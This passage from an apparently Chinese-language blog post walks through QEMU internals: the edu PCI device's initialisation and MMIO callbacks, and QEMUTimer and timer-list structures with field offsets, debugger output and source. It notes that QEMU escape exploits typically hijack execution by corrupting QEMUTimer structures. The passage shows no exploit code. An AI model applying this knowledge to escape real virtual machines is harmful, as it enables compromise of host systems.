class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>realize</code> 和 <code>exit</code> 函数定义的是对象初始化和销毁中可能会失败的操作。</p>
<blockquote>
<ul>
<li><strong>class_init（类初始化，ObjectClass 级）</strong>：设定<strong>类的默认虚函数&#x2F;回调</strong>（比如把 <code>DeviceClass::realize</code> 指向你的实现），不触碰实例数据。对象尚未出现。<ul>
<li>设定&#x2F;覆盖虚函数：<code>dc-&gt;realize</code>、<code>dc-&gt;unrealize</code>、<code>desc</code>、<code>user_creatable</code> 等。</li>
<li>静态属性数组（<code>device_class_set_props()</code> 给 <code>DeviceClass.props_</code>）。</li>
</ul>
</li>
<li><strong>instance_init（实例初始化，Object 实例级，必须不失败）</strong>：新建对象后，<strong>给实例字段设默认值、创建子对象的“壳”(object_initialize)、注册 QOM 属性</strong>等；<strong>不能失败</strong>。此时<strong>不</strong>把设备接到总线，也<strong>不</strong>占用全局资源。<ul>
<li>设实例缺省值；</li>
<li><strong>用 <code>object_property_add*()</code> 注册 QOM 属性</strong>（这样 <code>--device xyz,help</code>&#x2F;<code>device-list-properties</code> 才看得到&#x2F;可设置）；</li>
<li>通过 <code>object_initialize()</code> 创建<strong>子对象的壳</strong>（注意：不是在这里 <code>realize</code> 子对象）。</li>
</ul>
</li>
<li><strong>realize（实现，可以失败）</strong>：把实例<strong>接入系统</strong>：校验用户已设置的属性、在总线上登记、映射 BAR&#x2F;MMIO、连 IRQ、申请可能失败的资源；<strong>可以失败</strong>，需通过 <code>errp</code> 报错。可选的 <code>unrealize</code> 负责撤销。<ul>
<li>依据<strong>属性</strong>做校验；</li>
<li><strong>接总线</strong>、分配并<strong>注册</strong> BAR&#x2F;MMIO&#x2F;PIO、连 IRQ、把子对象逐个 <code>realize</code>；</li>
<li>申请任何可能失败的外部资源；必要时通过 <code>Error **errp</code> 返回错误。</li>
</ul>
</li>
</ul>
</blockquote>
<p>设备内存的注册多出现在 <code>realize</code> 函数中，例如 edu 中的 <code>memory_region_init_io</code> 和 <code>pci_register_bar</code> 注册了一块 MMIO 类型的内存。我们需要重点关注 <code>MemoryRegionOps</code> 结构体 <code>edu_mmio_ops</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_edu_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    EduState *edu = EDU(pdev);</span><br><span class="line">    <span class="type">uint8_t</span> *pci_conf = pdev-&gt;config;</span><br><span class="line"></span><br><span class="line">    pci_config_set_interrupt_pin(pci_conf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msi_init(pdev, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">true</span>, <span class="literal">false</span>, errp)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    timer_init_ms(&amp;edu-&gt;dma_timer, QEMU_CLOCK_VIRTUAL, edu_dma_timer, edu);</span><br><span class="line"></span><br><span class="line">    qemu_mutex_init(&amp;edu-&gt;thr_mutex);</span><br><span class="line">    qemu_cond_init(&amp;edu-&gt;thr_cond);</span><br><span class="line">    qemu_thread_create(&amp;edu-&gt;thread, <span class="string">&quot;edu&quot;</span>, edu_fact_thread,</span><br><span class="line">                       edu, QEMU_THREAD_JOINABLE);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;edu-&gt;mmio, OBJECT(edu), &amp;edu_mmio_ops, edu,</span><br><span class="line">                    <span class="string">&quot;edu-mmio&quot;</span>, <span class="number">1</span> * MiB);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;edu-&gt;mmio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_edu_uninit</span><span class="params">(PCIDevice *pdev)</span></span><br><span class="line">&#123;</span><br><span class="line">    EduState *edu = EDU(pdev);</span><br><span class="line"></span><br><span class="line">    qemu_mutex_lock(&amp;edu-&gt;thr_mutex);</span><br><span class="line">    edu-&gt;stopping = <span class="literal">true</span>;</span><br><span class="line">    qemu_mutex_unlock(&amp;edu-&gt;thr_mutex);</span><br><span class="line">    qemu_cond_signal(&amp;edu-&gt;thr_cond);</span><br><span class="line">    qemu_thread_join(&amp;edu-&gt;thread);</span><br><span class="line"></span><br><span class="line">    qemu_cond_destroy(&amp;edu-&gt;thr_cond);</span><br><span class="line">    qemu_mutex_destroy(&amp;edu-&gt;thr_mutex);</span><br><span class="line"></span><br><span class="line">    timer_del(&amp;edu-&gt;dma_timer);</span><br><span class="line">    msi_uninit(pdev);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>edu_mmio_ops</code> 结构体定义如下，可以看到 edu 设备自定义的读写函数 <code>edu_mmio_read</code> 和 <code>edu_mmio_write</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps edu_mmio_ops = &#123;</span><br><span class="line">    .read = edu_mmio_read,</span><br><span class="line">    .write = edu_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">    .valid = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">8</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">8</span>,</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h2 id="QEMUTimer"><a href="#QEMUTimer" class="headerlink" title="QEMUTimer"></a>QEMUTimer</h2><p><strong>QEMUTimer</strong> 是 QEMU 事件循环里的<strong>软件定时器对象</strong>：挂在某个 <strong>QEMUClock</strong> 上，按指定“时钟”的时间线到点就回调你的处理函数，用来驱动设备里的超时、周期性中断等逻辑。</p>
<blockquote>
<p>QEMU 有四条时间线，你创建定时器时要选其一：<code>realtime</code>（宿主墙钟）、<code>host</code>（宿主单调时钟）、<code>virtual</code>（只在 guest 运行时前进）、<code>virtual_rt</code>（按 guest 速度走但用于客体外模块）。做设备建模一般用 <code>virtual</code>，因为它会在 VM 暂停&#x2F;断点时一起停，从而保持确定性。</p>
</blockquote>
<p>简单来说 <strong>QEMUTimer &#x3D; “挂在某条 QEMUClock 时间线上的回调闹钟”</strong>。设备模型里写寄存器→计算到期点→<code>timer_mod()</code>→到点发 IRQ&#x2F;做 DMA，就是它的日常工作流。</p>
<p>由于 <code>QEMUTimer</code> 会定期回调一些指针结构，因此在 QEMU 逃逸中我们通常选择通过修改 <code>QEMUTimer</code> 相关结构来劫持程序执行流。</p>
<h3 id="QEMUTimer-相关结构"><a href="#QEMUTimer-相关结构" class="headerlink" title="QEMUTimer 相关结构"></a>QEMUTimer 相关结构</h3><p>相关函数和结构如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 定时器链表：挂在某个 QEMUClock（且通常属于某个 AioContext/事件循环）的到期队列 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> &#123;</span></span><br><span class="line">    QEMUClock *clock;                 <span class="comment">// 归属的时钟对象（决定时间线：REALTIME/VIRTUAL/HOST/VIRTUAL_RT）</span></span><br><span class="line">    QemuMutex active_timers_lock;     <span class="comment">// 保护 active_timers 单链表的互斥锁</span></span><br><span class="line">    QEMUTimer *active_timers;         <span class="comment">// “按到期时间升序”的单链表表头（最早到期的在表头）</span></span><br><span class="line"></span><br><span class="line">    QLIST_ENTRY(QEMUTimerList) <span class="built_in">list</span>;  <span class="comment">// 将本 TimerList 挂到 QEMUClock.timerlists 的链表指针（le_next/le_prev）</span></span><br><span class="line"></span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb; <span class="comment">// 当最早到期时间变化时用于唤醒/通知事件循环的回调（如调整poll/epoll超时）</span></span><br><span class="line">    <span class="type">void</span> *notify_opaque;              <span class="comment">// 传给 notify_cb 的上下文指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 轻量事件：标记一次“本 timerlist 的运行（扫描并执行回调）”结束 */</span></span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 时钟对象：一条时间线及其挂在其上的所有 TimerList（通常每个 AioContext 里各自维护一组列表）</span></span><br><span class="line"><span class="comment"> * 注：注释里 BQL 指 Big QEMU Lock，保护 timerlists 这个“容器”的增删等结构性操作</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QEMUClock</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 依赖 BQL 保护对 timerlists 的修改（插入/删除 QEMUTimerList 元素） */</span></span><br><span class="line">    QLIST_HEAD(, QEMUTimerList) timerlists;  <span class="comment">// 指向所有 QEMUTimerList 的链表头（每上下文/线程一个）</span></span><br><span class="line"></span><br><span class="line">    QEMUClockType type;    <span class="comment">// 时钟类型：REALTIME/VIRTUAL/HOST/VIRTUAL_RT</span></span><br><span class="line">    <span class="type">bool</span> enabled;          <span class="comment">// 该时钟是否启用（禁用时不触发其上定时器）</span></span><br><span class="line">&#125; QEMUClock;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定时器对象：挂在某个 QEMUTimerList 上，到期时执行回调 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* 以纳秒为单位的绝对到期时间（对应其 clock 的时间线） */</span></span><br><span class="line">    QEMUTimerList *timer_list;  <span class="comment">// 归属的 timerlist（新增/移除时由调度代码维护）</span></span><br><span class="line">    QEMUTimerCB *cb;            <span class="comment">// 定时器回调：void (*cb)(void *opaque)</span></span><br><span class="line">    <span class="type">void</span> *opaque;               <span class="comment">// 传给回调的上下文</span></span><br><span class="line">    QEMUTimer *next;            <span class="comment">// 将各定时器按到期时间串成单链表（active_timers 使用）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> attributes;             <span class="comment">// 属性位（如 QEMU_TIMER_ATTR_EXTERNAL：是否影响guest状态等，配合 rr/检查点）</span></span><br><span class="line">    <span class="type">int</span> scale;                  <span class="comment">// 时间单位到纳秒的换算系数（如 ms 定时器为 1,000,000；ns 定时器为 1）</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* QEMU 封装的互斥量：在 pthread_mutex_t 外增添了调试/初始化状态 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QemuMutex</span> &#123;</span></span><br><span class="line">    <span class="type">pthread_mutex_t</span> lock;   <span class="comment">// 实际的 pthread 互斥量</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_MUTEX</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *file;       <span class="comment">// 调试构建下：记录最后一次 init/lock 操作点的源文件</span></span><br><span class="line">    <span class="type">int</span> line;               <span class="comment">// 调试构建下：记录对应的行号</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">bool</span> initialized;       <span class="comment">// 是否已完成底层初始化（避免重复 init/destroy）</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 时钟类型枚举：决定定时器所依托的时间线 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    QEMU_CLOCK_REALTIME = <span class="number">0</span>,  <span class="comment">// 宿主墙钟（受宿主挂起/调整影响）</span></span><br><span class="line">    QEMU_CLOCK_VIRTUAL = <span class="number">1</span>,   <span class="comment">// 虚拟时钟（仅在 guest 运行时前进；icount 下与指令数绑定）</span></span><br><span class="line">    QEMU_CLOCK_HOST = <span class="number">2</span>,      <span class="comment">// 宿主单调时钟（不倒退；用于不直接影响 guest 状态的任务）</span></span><br><span class="line">    QEMU_CLOCK_VIRTUAL_RT = <span class="number">3</span>,<span class="comment">// “虚拟实时”时钟（与 guest 节奏相关，供客体外模块使用）</span></span><br><span class="line">    QEMU_CLOCK_MAX</span><br><span class="line">&#125; QEMUClockType;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 一组与时钟类型一一对应的 TimerList 指针（通常每个事件循环都维护一份这样的组） */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerListGroup</span> &#123;</span></span><br><span class="line">    QEMUTimerList *tl[QEMU_CLOCK_MAX];  <span class="comment">// 索引 0..3 分别对应 REALTIME/VIRTUAL/HOST/VIRTUAL_RT</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 主事件循环的那组 TimerList（四条时间线各一个） */</span></span><br><span class="line"><span class="keyword">extern</span> QEMUTimerListGroup main_loop_tlg;</span><br></pre></td></tr></table></figure></div>

<p>各个结构之间的关系如下：</p>
<pre class="mermaid">classDiagram
direction LR

class QEMUTimer {
  expire_time : int64_t (0x00)
  timer_list  : QEMUTimerList* (0x08)
  cb          : QEMUTimerCB* (0x10)
  opaque      : void* (0x18)
  next        : QEMUTimer* (0x20)
  attributes  : int (0x28)
  scale       : int (0x2C)
  size        : 0x30
}

class QemuMutex {
  lock        : pthread_mutex_t (0x00, 0x28)
  initialized : bool (0x28)
  size        : 0x30
}

class QEMUClock {
  timerlists_lh_first : QEMUTimerList* (0x00)
  type        : QEMUClockType (0x08)
  enabled     : bool (0x0C)
  size        : 0x10
}

class QEMUTimerList {
  clock               : QEMUClock* (0x00)
  active_timers_lock  : QemuMutex (0x08, 0x30)
  active_timers       : QEMUTimer* (0x38)
  list.le_next        : QEMUTimerList* (0x40)
  list.le_prev        : QEMUTimerList** (0x48)
  notify_cb           : QEMUTimerListNotifyCB* (0x50)
  notify_opaque       : void* (0x58)
  timers_done_ev      : QemuEvent (0x60, 0x08)
  size                : 0x68
}

class QEMUTimerListGroup {
  tl_0_REALTIME  : QEMUTimerList* (0x00)
  tl_1_VIRTUAL   : QEMUTimerList* (0x08)
  tl_2_HOST      : QEMUTimerList* (0x10)
  tl_3_VIRTUAL_RT: QEMUTimerList* (0x18)
  size           : 0x20
}

QEMUClock o-- QEMUTimerList : timerlists
QEMUTimerList --> QEMUClock : clock
QEMUTimerList o-- QEMUTimer : active_timers
QEMUTimer --> QEMUTimer : next
QEMUTimer --> QEMUTimerList : timer_list
QEMUTimerList --> QemuMutex : active_timers_lock
QEMUTimerListGroup o-- QEMUTimerList : tl_*</pre>

<h3 id="QEMUTimer-使用"><a href="#QEMUTimer-使用" class="headerlink" title="QEMUTimer 使用"></a>QEMUTimer 使用</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    QEMUTimer *tmr;</span><br><span class="line">    <span class="type">int64_t</span> period_ns;</span><br><span class="line">&#125; MyDev;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_cb</span><span class="params">(<span class="type">void</span> *opaque)</span> &#123;</span><br><span class="line">    MyDev *s = opaque;</span><br><span class="line">    <span class="comment">/* ...真正要做的事... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_realize</span><span class="params">(MyDev *s)</span> &#123;</span><br><span class="line">    s-&gt;tmr = timer_new_ns(QEMU_CLOCK_VIRTUAL, my_cb, s);</span><br><span class="line">    s-&gt;period_ns = <span class="number">5</span> * <span class="number">1000</span> * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int64_t</span> now = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">    timer_mod_ns(s-&gt;tmr, now + s-&gt;period_ns);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_unrealize</span><span class="params">(MyDev *s)</span> &#123;</span><br><span class="line">    <span class="comment">/* 2021 起，timer_free() 会隐含 timer_del()，可直接释放 */</span></span><br><span class="line">    timer_free(s-&gt;tmr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>timer_new_*</code> 函数创建一个 <code>QEMUTimer</code> 结构。最终都会调用到 <code>timer_init_full</code> 函数。</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>bt
#0  <font color="#C4A000">timer_init_full</font> (ts=0x55555580e330 &lt;_start&gt;, timer_list_group=0x7fffffffd9e0, type=QEMU_CLOCK_REALTIME, scale=48, attributes=256, cb=0x7ffff76bab95 &lt;__libc_calloc+133&gt;, opaque=0x0) at <font color="#4E9A06">../util/qemu-time</font>1
#1  <font color="#3465A4">0x0000555555c914e2</font> in <font color="#C4A000">timer_new_full</font> (timer_list_group=0x0, type=QEMU_CLOCK_VIRTUAL_RT, scale=1, attributes=0, cb=0x555555c916c5 &lt;cpu_throttle_timer_tick&gt;, opaque=0x0) at <font color="#4E9A06">/home/flyyy/Desktop/qemu-vul/q</font>4
#2  <font color="#3465A4">0x0000555555c91527</font> in <font color="#C4A000">timer_new</font> (type=QEMU_CLOCK_VIRTUAL_RT, scale=1, cb=0x555555c916c5 &lt;cpu_throttle_timer_tick&gt;, opaque=0x0) at <font color="#4E9A06">/home/flyyy/Desktop/qemu-vul/qemu-5.2.0-rc4/include/qemu/timer.h</font>:544
#3  <font color="#3465A4">0x0000555555c91553</font> in <font color="#C4A000">timer_new_ns</font> (type=QEMU_CLOCK_VIRTUAL_RT, cb=0x555555c916c5 &lt;cpu_throttle_timer_tick&gt;, opaque=0x0) at <font color="#4E9A06">/home/flyyy/Desktop/qemu-vul/qemu-5.2.0-rc4/include/qemu/timer.h</font>:562
#4  <font color="#3465A4">0x0000555555c9189b</font> in <font color="#C4A000">cpu_throttle_init</font> () at <font color="#4E9A06">../softmmu/cpu-throttle.c</font>:120
#5  <font color="#3465A4">0x0000555555c41869</font> in <font color="#C4A000">cpu_timers_init</font> () at <font color="#4E9A06">../softmmu/cpu-timers.c</font>:278
#6  <font color="#3465A4">0x0000555555be5b99</font> in <font color="#C4A000">qemu_init</font> (argc=18, argv=0x7fffffffdda8, envp=0x7fffffffde40) at <font color="#4E9A06">../softmmu/vl.c</font>:4256
#7  <font color="#3465A4">0x000055555580e445</font> in <font color="#C4A000">main</font> (argc=18, argv=0x7fffffffdda8, envp=0x7fffffffde40) at <font color="#4E9A06">../softmmu/main.c</font>:49
#8  <font color="#3465A4">0x00007ffff7643083</font> in <font color="#C4A000">__libc_start_main</font> (main=0x55555580e419 &lt;main&gt;, argc=18, argv=0x7fffffffdda8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdd98) at <font color="#4E9A06">..</font>8
#9  <font color="#3465A4">0x000055555580e35e</font> in <font color="#C4A000">_start</font> ()</pre>

<p>该函数初始化 <code>QEMUTimer</code> 结构，其中 <code>expire_time</code> 被设置为 -1，因此默认不会调用回调函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">timer_init_full</span><span class="params">(QEMUTimer *ts,</span></span><br><span class="line"><span class="params">                     QEMUTimerListGroup *timer_list_group, QEMUClockType type,</span></span><br><span class="line"><span class="params">                     <span class="type">int</span> scale, <span class="type">int</span> attributes,</span></span><br><span class="line"><span class="params">                     QEMUTimerCB *cb, <span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!timer_list_group) &#123;</span><br><span class="line">        timer_list_group = &amp;main_loop_tlg;</span><br><span class="line">    &#125;</span><br><span class="line">    ts-&gt;timer_list = timer_list_group-&gt;tl[type];</span><br><span class="line">    ts-&gt;cb = cb;</span><br><span class="line">    ts-&gt;opaque = opaque;</span><br><span class="line">    ts-&gt;scale = scale;</span><br><span class="line">    ts-&gt;attributes = attributes;</span><br><span class="line">    ts-&gt;expire_time = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


<p>之后 <code>timer_mod_ns()</code> 把定时器插入<strong>按到期时间排序</strong>的链表；如果它成了<strong>新的表头</strong>，框架会<strong>打断 poll 并重算 deadline</strong>（rearm），以便尽快触发。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 将定时器 ts 的到期绝对时间改为 expire_time（单位：ns）。</span></span><br><span class="line"><span class="comment"> * 语义：当 clock_now &gt;= expire_time 时触发 ts-&gt;cb(opaque)。</span></span><br><span class="line"><span class="comment"> * 若本次修改使 ts 成为“新的表头”（最早到期），则需要 rearm：解锁后通知事件循环更新 deadline。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">timer_mod_ns</span><span class="params">(QEMUTimer *ts, <span class="type">int64_t</span> expire_time)</span></span><br><span class="line">&#123;</span><br><span class="line">    QEMUTimerList *timer_list = ts-&gt;timer_list;</span><br><span class="line">    <span class="type">bool</span> rearm;</span><br><span class="line"></span><br><span class="line">    qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">    <span class="comment">/* 先从 active_timers 单链表中删除（若未在队列中相当于空操作） */</span></span><br><span class="line">    timer_del_locked(timer_list, ts);</span><br><span class="line">    <span class="comment">/* 在持锁状态下按到期时间有序插入，返回值表示是否插到了表头 */</span></span><br><span class="line">    rearm = timer_mod_ns_locked(timer_list, ts, expire_time);</span><br><span class="line">    qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 若成为新的表头，需要“重装闹钟”（rearm）：</span></span><br><span class="line"><span class="comment">     * 即通过 timerlist_rearm()-&gt;notify_cb() 打断 poll/epoll，促使事件循环尽快醒来。</span></span><br><span class="line"><span class="comment">     * 注意在解锁后进行，避免在持锁时调用可能唤醒/跨线程的路径导致锁顺序问题。 */</span></span><br><span class="line">    <span class="keyword">if</span> (rearm) &#123;</span><br><span class="line">        timerlist_rearm(timer_list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在持有 active_timers_lock 的前提下，完成“按到期时间排序”的插入。</span></span><br><span class="line"><span class="comment"> * 返回：true 表示插入位置是表头（需要 rearm）；false 表示插入在非表头。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">timer_mod_ns_locked</span><span class="params">(QEMUTimerList *timer_list,</span></span><br><span class="line"><span class="params">                                QEMUTimer *ts, <span class="type">int64_t</span> expire_time)</span></span><br><span class="line">&#123;</span><br><span class="line">    QEMUTimer **pt, *t;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 在升序链表中找到插入点：</span></span><br><span class="line"><span class="comment">     * 这里复用了 timer_expired_ns(x, y) 判断“x 是否在时间 y 之前(&lt;=)”的语义。</span></span><br><span class="line"><span class="comment">     * 我们把 y 传入为“待插入 ts 的 expire_time”，</span></span><br><span class="line"><span class="comment">     * 因此：当现有 t 的到期时间 &lt;= ts 的到期时间 时，继续向后走；</span></span><br><span class="line"><span class="comment">     * 一旦遇到 t-&gt;expire_time &gt; ts-&gt;expire_time（或 t 为 NULL），停止在 t 前面插入。</span></span><br><span class="line"><span class="comment">     * 由此保证链表按到期时间升序，且“相同到期时间”的新定时器会插到已有同刻定时器之后（稳定性/FIFO）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    pt = &amp;timer_list-&gt;active_timers;  <span class="comment">// pt 指向“前驱的 next 指针”（头结点时就是 &amp;head）</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        t = *pt;</span><br><span class="line">        <span class="keyword">if</span> (!timer_expired_ns(t, expire_time)) &#123;</span><br><span class="line">            <span class="keyword">break</span>;  <span class="comment">// t 为 NULL 或 t-&gt;expire_time &gt; expire_time：找到插入点</span></span><br><span class="line">        &#125;</span><br><span 